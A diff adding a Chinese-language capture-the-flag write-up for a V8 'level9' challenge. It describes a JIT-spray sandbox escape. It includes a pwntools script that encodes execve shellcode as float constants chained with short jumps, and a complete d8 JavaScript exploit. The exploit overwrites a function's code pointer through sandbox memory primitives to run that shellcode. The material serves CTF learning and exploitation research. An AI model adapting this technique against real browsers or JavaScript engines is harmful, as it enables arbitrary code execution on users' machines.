@@ -538,3 +538,63 @@ while(1){}
 - 并非不难
 
 据说接下来的level8很难。感觉旅途要在这里结束了 :(
+
+## level9
+
+level8确实很难，所以先看level9（
+
+level9疑似level2的精神续作，直接给了任意读写的primitive。唯一的问题是开了沙盒，即使给了任意读写的primitive也写不出沙盒，而沙盒里也没有东西可以帮助我们拿到rce……吗？
+
+搜相似题目时搜到了 https://ju256.rip/posts/kitctfctf22-date 。也是给了沙盒内的任意地址读写和`getAddressOf`，区别是这篇wp里没有JIT和wasm。emmm，我们有啊，于是顺藤摸瓜，摸到了 https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox 。这篇文章介绍了利用函数的JIT code实现rce的方法，具体操作是覆盖函数对应的code object内的code_entry_point字段。但不知为什么，可能是环境内的d8版本比较新，总之code_entry_point字段已经不存在了
+
+但这个方法并非完全无法使用。我搜到了另一篇文章： https://tttang.com/archive/1443 ，仍然是利用函数的JIT code，只是覆盖的是函数对象内的code字段本身。当一个函数返回double数组时，其JIT汇编代码会存在一大段`REX.W movq r10, xxx`(pwndbg反汇编出来的指令名称和gdb有点不同，但无需担心，因为特征非常明显，调试肯定找得到)。xxx是数组的浮点数元素，占8个字节。如果我们来个字节错位，就能让这8个字节作为shellcode执行。当然8个字节是写不出什么有用的shellcode的，所以要用jmp将多段shellcode串联起来。jmp需要两个字节，于是剩下六个字节可以自由发挥。shellcode生成脚本如下：
+```py
+from pwn import *
+import struct
+context.arch='amd64'
+shellcode="""push 0x6761
+    push 1818653793; pop rbx
+    push 1664050535; pop rcx
+    shl rbx, 0x20
+    add rbx, rcx; push rbx
+    push 1852140652; pop rsi
+    push 1634231087; pop rdx
+    shl rsi, 0x20
+    add rsi, rdx; push rsi
+    mov rdi,rsp
+    xor edx, edx
+    xor esi, esi
+    push SYS_execve
+    pop rax
+    syscall""".split('\n')
+def convert(x):
+    assert len(x)<=6
+    jmp = b'\xeb\x0c'
+    return x.ljust(6, b'\x90') + jmp
+result=[]
+for i in shellcode:
+    part=i.lstrip()
+    result.append(struct.unpack('d', convert(asm(part)))[0])
+print(result)
+```
+一个烦人的地方在于，题目要求执行`/challenge/catflag`（似乎相对目录是不行的），长度远超8个字节，因此需要分批次写入。注意我在`push xxx; pop xxx`处均使用了不同的寄存器；第一段用rbx和rcx，第二段用rsi和rdx。我发现出现的汇编语句不能重复，因为重复的汇编语句会生成重复的浮点数，导致v8优化时会不遵循先前假设的结构，shellcode执行失败。此处可以在调试器中查看，当出现重复语句后，v8不再用`REX.W movq r10, xxx`来存取值，而是别的什么语句
+
+最后就是看应该把函数对象的code字段覆盖成什么值了。推导过程可以看上面的文章，我这直接放公式：`原code字段值+(第一个REX.W movq语句出现地址+2-0x3f-原code字段值)`
+```js
+var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
+var dv = new DataView(sbxMemView);
+var addrOf = (o) => Sandbox.getAddressOf(o);
+var readHeap4 = (offset) => dv.getUint32(offset, true);   
+var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);   
+const foo = ()=>
+  {
+      return [1.0,1.971025155501187e-246, 1.9563384012934637e-246, 1.9557696654558445e-246, 1.9711824228871598e-246, 1.971182639857203e-246, 1.957178600143391e-246, 1.9560470663288823e-246, 1.9711824229371098e-246, 1.9711826528275368e-246, 1.9711829003383248e-246, 1.9711828988945186e-246, 1.97118289889686e-246, 1.9711828988847122e-246, 1.971182898890236e-246, 1.971182898881177e-246];
+  }
+for (var huh=0; huh < 1000000; huh++) {
+    foo();foo();foo();foo();
+}
+let code=readHeap4(addrOf(foo)+24);
+writeHeap4(addrOf(foo)+24,code+0x7a);
+foo();
+```
+没错就这么简单……返回的double数组开头的1.0用来满足跳转到shellcode的条件
